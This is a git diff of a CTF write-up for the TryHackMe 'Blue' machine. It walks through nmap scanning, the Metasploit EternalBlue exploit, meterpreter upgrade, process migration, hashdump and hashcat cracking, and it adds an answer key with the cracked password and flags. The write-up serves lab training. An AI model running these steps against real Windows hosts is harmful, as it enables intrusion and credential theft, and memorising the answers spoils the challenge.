@@ -5,17 +5,11 @@ Has following sequels as Ice and Blaster.
  
 > Pratyush Prakhar (5#1NC#4N) - 10/30/2020
 
-## RECON
+## RECONNAISSANCE
 
-1. Scan the machine using the favourite tool of all times - nmap.
+1. Scan the machine using the favorite tool of all times - nmap.
+   1. Ran a quick scan for the required port range (0-1000). 
 
-2. How many ports are open with a port number under 1000? - **3**
-	
-	Ran a quick scan for the required port range (0-1000). 
-
-```bash
-nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42
-```
 **Output**
 
 ```bash
@@ -29,10 +23,8 @@ PORT    STATE SERVICE      REASON
 139/tcp open  netbios-ssn  syn-ack ttl 125
 445/tcp open  microsoft-ds syn-ack ttl 125
 ```
-Then ran a standard scan - Default services and scripts on the determined specific ports **(135,139,445)**
-```bash
-nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42
-```
+   2. Then ran a standard scan - Default services and scripts on the determined specific ports **(135,139,445)**
+
 **Output**
 
 ```bash
@@ -45,9 +37,8 @@ PORT    STATE SERVICE      REASON          VERSION
 445/tcp open  microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
 ```
 
-3.  What is this machine vulnerable to? - **ms17-010**
+2. Ran a nmap scan for finding the known vulnerabilities. We found that the box is susceptible to [MS17-010 EternalBlue CVE](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/).
 
-	Ran a nmap scan for finding the known vulnerabilities. 
 ```bash
 nmap -vv -p135,139,445 --script vuln -oN nmap/vulnub.nmap 10.10.130.42
 ```
@@ -79,6 +70,8 @@ Host script results:
 
 1. Start Metasploit. One can doing it by simply _msfconsole_ command. But there is a better way to load the _msfdb_ first to have faster access. Metasploit is a great tool. Use it like any other. Doesn't make you a script kiddie :)
 
+**Output**
+
 ```bash
 $ sudo msfdb init
 [+] Starting database
@@ -89,13 +82,9 @@ $ sudo msfdb init
 [+] Creating initial database schema
 $ sudo msfdb run
 [i] Database already started
-
-msf5 > 
 ```
 
-2. Find the exploitation code we will run against the machine. What is the full path of the code? - **exploit/windows/smb/ms17_010_eternalblue** 
-
-	We use the _eternalblue_ one but actually the _psexec_ is the **most stable** verion of the exploit. It should be used in normall scenerios. 
+2. We use the _eternalblue_ one but actually the _psexec_ is the **most stable** version of the exploit. It should be used in normal scenarios. 
 
 **OUTPUT**
 
@@ -114,9 +103,7 @@ Matching Modules
 4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
 ```
 
-3. Show options and set the one required value. What is the name of this value? - **RHOSTS** 
-
-	_RHOSTS_ is the only flag required and not set. One can make additional chages to flags like _LHOST_ and _PAYLOAD_. We set RHOST to $BOX_IP and run the exoplit. I also set 	my _LPORT_ to 9999. 
+3. _RHOSTS_ is the only flag required and not set. One can make additional chages to flags like _LHOST_ and _PAYLOAD_. We set RHOST to $BOX_IP and run the exoplit. I also set 	my _LPORT_ to 9999. 
 
 **OUTPUT**
 ```bash
@@ -134,7 +121,7 @@ RPORT          445              yes       The target port (TCP)
 SMBDomain      .                no        (Optional) The Windows domain to use for authentication
 ```
 
-4. Run the exploit! - **SUCCESS**
+4. Run the exploit and we are in.
 
 **OUTPUT**
 
@@ -171,6 +158,8 @@ SMBDomain      .                no        (Optional) The Windows domain to use f
 
 5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). 
 
+**Output**
+
 ```bash
 msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions
 
@@ -185,9 +174,11 @@ Id  Name  Type                     Information                   Connection
 \
 We see we have indeed backgrounded our session.
 
-## ESCLATE
+## PRIVESC
 
-1. Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? - **post/multi/manage/shell_to_meterpreter**
+1. We are going to create a msf shell from the shell we have got. This will give us additional functionality to dig around the box. We use the one found here and set the `Session` to the open session we have.
+
+**Output**
 
 ```bash
 msf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
@@ -198,11 +189,7 @@ Matching Modules
 #  Name                                    Disclosure Date  Rank    Check  Description
 -  ----                                    ---------------  ----    -----  -----------
 0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
-```
 
-2. Select this (use MODULE_PATH). Show options, what option are we required to change? - **SESSION**
-
-```bash
 msf5 post(multi/manage/shell_to_meterpreter) > options
 
 Module options (post/multi/manage/shell_to_meterpreter):
@@ -215,10 +202,11 @@ Module options (post/multi/manage/shell_to_meterpreter):
    SESSION                   yes       The session to run this module on.
 
 msf5 post(multi/manage/shell_to_meterpreter) > set session 1
-
 ```
 
-6. Verify that we have escalated to NT AUTHORITY\SYSTEM. - **SUCCESS**
+2. Let's test the privilege escalations. We are `System` on the system.
+
+**Output**
 
 ```ps
 meterpreter > shell
@@ -232,7 +220,9 @@ whoami
 nt authority\system
 ```
 
-7. List all of the processes running via the 'ps' command. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id. - **2828**
+7. List all of the processes running via the 'ps' command. we find that the `2828 PID is interesting and out of the normal. Let's dig into it by **migrating into it**.
+
+**Output**
 
 ```bash
 meterpreter > ps
@@ -248,39 +238,33 @@ Process List
  2708  696   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe
  2756  696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
  2828  696   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
-```
 
-8. Migrate to this process. - **SUCCESS**
-
-```sh
 meterpreter > migrate 2828
 [*] Migrating from 2756 to 2828...
 [*] Migration completed successfully.
 ```
 
-# CRACKING
+## CRACKING CREDs
 
-1. Within our elevated meterpreter shell, run the command 'hashdump'. What is the name of the non-default user? - **Jon**
+1. Within our elevated meterpreter shell, run the command 'hashdump'. We found creds for a non-default user `Jon` in it.\
+We can now use _hashcat or johntheripper_ to crack them with correct mode and wordlist.
 
+**Output**
 ```bash
 meterpreter > hashdump
 Administrator:***************************************************************:::
 Guest::***************************************************************:::
 Jon::***************************************************************:::
 ```
-\
-We can now use _hashcat or johntheripper_ to crack them with correct mode and wordlist.
 
-2. What is the cracked password?
-
-The acquired hashes are **raw LANMAN/NTLM hashes**. The fourth field consist of the NTLM hash. We can use hascat to crack them with the following cmd.
+2. The acquired hashes are **raw LANMAN/NTLM hashes**. The fourth field consist of the NTLM hash. We can use hascat to crack them with the following cmd.
 ```bash
 hashcat -m 1000 -a 3 hashes /opt/rockyou.txt
 ```
 \
 The NTLM hashes are stored in hashes file. Dictionary used is rockyou.txt. 
 
-## FLAGS
+## FINDING FLAGS
 
 1. Flag1? - **Stored in C:\ dir**
 
@@ -305,5 +289,31 @@ type flag3.txt
 
 We can mark the box complete now after submitting all the flags. Onto the next challenge !! 
 
-Stay Tuned On\
+
+## Answers to complete the box
+
+1. Task 1
+   1.  How many ports are open with a port number under 1000? - **3**
+   2. What is this machine vulnerable to? - **ms17-010**
+
+2. Task 2
+   1. Find the exploitation code we will run against the machine. What is the full path of the code? - **exploit/windows/smb/ms17_010_eternalblue** 
+   2. Show options and set the one required value. What is the name of this value? - **RHOSTS** 
+
+3. Task 3
+   1. Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? - **post/multi/manage/shell_to_meterpreter**
+   2. Select this (use MODULE_PATH). Show options, what option are we required to change? - **SESSION**
+   3. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id. - **2828**.
+
+4. Task 4
+   1. What is the name of the non-default user? - **Jon**
+   2. What is the cracked password? - **alqfna22**
+
+5. Task 5
+   1. Flag 1 - flag{access_the_machine}
+   2. Flag 2 - flag{sam_database_elevated_access}
+   3. Flag 3 - flag{admin_documents_can_be_valuable}
+
+
+**Stay Tuned On**\
 [![alt text](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/Github.png)](https://github.com/pratty010/Boxes)   [![alt text](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/LinkedIn.png)](https://www.linkedin.com/in/pratyush-prakhar/)
